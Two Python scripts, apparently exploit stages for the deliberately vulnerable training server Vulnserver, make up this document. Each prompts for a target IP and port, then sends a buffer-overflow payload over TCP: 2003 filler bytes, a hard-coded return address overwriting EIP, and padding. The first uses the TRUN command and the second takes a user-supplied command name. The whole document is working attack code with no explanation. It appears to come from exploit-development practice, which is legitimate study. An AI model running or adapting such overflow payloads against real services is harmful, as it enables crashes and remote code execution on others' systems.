#!/usr/bin/python3

import sys,socket
from time import sleep


print("****************Vuln_Server Vulnerability*************")
sleep(0.5)
ip_address=input("Enter the IP address:\n")
port_number=input("Enter the port number:\n")

if(len(ip_address)<=0) or (len(port_number)<=0):
    if(len(ip_address)>0) and (len(port_number)<=0):
        print("*"*30)
        print("Port number field is empty")
    elif(len(ip_address)<=0) and (len(port_number)>0):
        print("*"*30)
        print("IP Address field is empty")
    else:
        print("*"*30)
        print("Issues with the user input")
elif(len(ip_address)>0) or (len(port_number)>0):
        print("*"*30)
        buffer=b"A" * 2003 + b"\xAF\x11\x50\x62" + b"C" * (2400-2003-4)
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect((ip_address, int(port_number)))
        s.send((b"TRUN /.:/" + buffer + b"\r\n"))
        s.close()
--------------------------------------------------------------------------------------------------------------------------
#!/usr/bin/python3

import sys,socket

ip_address=input("Enter the IP address:\n")
port_number=input("Enter the Port number:\n")
command_name=input("Enter the command name:\n")

if (len(ip_address)<=0) or (len(port_number)<=0) or (len(command_name)<=0):
    if (len(ip_address)>0) and (len(port_number)<=0) and (len(command_name)<=0):
        print("Port number field is empty")
        print("Command name field is empty")
    elif (len(ip_address)>0) and (len(port_number)>0) and (len(command_name)<=0):
        print("Command name field is empty")
    elif (len(ip_address)>0) and (len(port_number)<=0) and (len(command_name)>0):
        print("Port number field is empty")
    elif (len(ip_address)<=0) and (len(port_number)<=0) and (len(command_name)>0):
        print("IP address field is empty")
        print("Port number field is empty")
    elif (len(ip_address)<=0) and (len(port_number)>0) and (len(command_name)<=0):
        print("IP address field is empty")
        print("Command name field is empty")
    elif (len(ip_address)<=0) and (len(port_number)>0) and (len(command_name)>0):
        print("IP address field is empty")
    elif (len(ip_address)<=0) and (len(port_number)<=0) and (len(command_name)<=0):
        print("IP address field is empty")
        print("Port number field is empty")
        print("Command name field is empty")
elif (len(ip_address)>0) and (len(port_number)>0) and (len(command_name)>0):
    print("*" * 30)
    buffer=b"A" * 2003 + b"\xAF\x11\x50\x62" + b"C" * (2500-4-2003)
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((ip_address, int(port_number)))
    s.send(bytes(command_name, 'utf-8') + b" /.:/" +buffer + b"\r\n")
    s.close
